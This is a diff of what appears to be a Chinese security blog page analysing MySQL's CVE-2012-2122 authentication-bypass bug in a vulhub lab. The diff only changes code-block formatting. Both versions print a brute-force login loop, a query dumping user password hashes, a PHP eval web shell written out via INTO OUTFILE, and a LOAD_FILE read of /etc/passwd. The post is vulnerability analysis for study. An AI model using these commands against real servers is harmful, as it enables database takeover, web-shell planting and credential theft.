@@ -119,24 +119,41 @@
 <p>经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。</p>
 <p>简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。</p>
 <p>漏洞介绍：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://seclists.org/oss-sec/2012/q2/493</span><br></pre></td></tr></table></figure>
-<p>漏洞原因：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">my_bool check_scramble(const uchar *scramble_arg, const char *message,</span><br><span class="line">               const uint8 *hash_stage2)</span><br><span class="line">&#123;</span><br><span class="line">  SHA1_CONTEXT sha1_context;</span><br><span class="line">  uint8 buf[SHA1_HASH_SIZE];</span><br><span class="line">  uint8 hash_stage2_reassured[SHA1_HASH_SIZE];</span><br><span class="line"></span><br><span class="line">  mysql_sha1_reset(&amp;sha1_context);</span><br><span class="line">  /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH);</span><br><span class="line">  mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE);</span><br><span class="line">  mysql_sha1_result(&amp;sha1_context, buf);</span><br><span class="line">  /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH);</span><br><span class="line">  /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context);</span><br><span class="line">  mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE);</span><br><span class="line">  mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured);</span><br><span class="line">  return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。</p>
+<pre><code>https://seclists.org/oss-sec/2012/q2/493
+</code></pre><p>漏洞原因：</p>
+<pre><code>my_bool check_scramble(const uchar *scramble_arg, const char *message,
+               const uint8 *hash_stage2)
+{
+  SHA1_CONTEXT sha1_context;
+  uint8 buf[SHA1_HASH_SIZE];
+  uint8 hash_stage2_reassured[SHA1_HASH_SIZE];
+
+  mysql_sha1_reset(&amp;sha1_context);
+  /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH);
+  mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE);
+  mysql_sha1_result(&amp;sha1_context, buf);
+  /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH);
+  /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context);
+  mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE);
+  mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured);
+  return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE);
+}
+</code></pre><p>以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。</p>
 <p>而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。</p>
 <p>漏洞利用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用如下poc：</span><br><span class="line">for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure>
-<p>环境采用vulhub的docker环境，测试成功后返回如下：</p>
+<pre><code>使用如下poc：
+for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done
+</code></pre><p>环境采用vulhub的docker环境，测试成功后返回如下：</p>
 <p><img src="\2019\04\MySQL历史漏洞分析\1555050537911.png" alt="1555050537911"></p>
 <p>那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user,password from mysql.user;</span><br></pre></td></tr></table></figure>
-<p><img src="\2019\04\MySQL历史漏洞分析\1555050975845.png" alt="1555050975845"></p>
+<pre><code>select user,password from mysql.user;
+</code></pre><p><img src="\2019\04\MySQL历史漏洞分析\1555050975845.png" alt="1555050975845"></p>
 <p>MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。</p>
 <p>还可以使用导出的形式，利用如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;/var/www/html/a.txt&apos;;  #这种需要知道web路径</span><br></pre></td></tr></table></figure>
-<p>同样也可以使用load_file来查看系统文件等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>
-
+<pre><code>Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;/var/www/html/a.txt&#39;;  #这种需要知道web路径
+</code></pre><p>同样也可以使用load_file来查看系统文件等</p>
+<pre><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;) 
+</code></pre>
           </div>
           <br><br>
               
